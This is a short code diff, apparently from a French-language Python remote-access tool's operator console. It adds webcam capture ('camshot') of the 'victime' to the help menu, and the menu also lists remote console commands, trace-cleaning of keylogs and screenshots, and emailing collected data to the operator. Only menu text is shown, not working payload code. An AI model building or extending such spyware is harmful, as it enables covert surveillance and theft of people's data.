@@ -17,7 +17,6 @@ def logo():
 	puts(colored.white("                     https://github.com/Eidknab/                      "))
 	print("")
 	print("")
-	print("")
 
 os.system("cls")
 logo()
@@ -54,7 +53,7 @@ print("")
 print("Liste des commandes: \n- cmd (permet l'utilisation des commandes consoles. Exemple: cmd cls) \
 	\n- clean (pour effacer toutes traces... Exemple: screenshots, camshots, keylogs...)\
 	\n- mail mailpw smtpadr smtpport (paramètres conernants la reception de données par mail de la victime)\
-	\n- scr (prend un screenshot sur l'ordinateur de la victime) \
+	\n- scr camshot (prendre un screenshot ou une image de la webcam de la victime) \
 	\n- rcv (recevoir toutes les données collectées par mail) \
 	\n- quit")
 msg_a_envoyer = b""
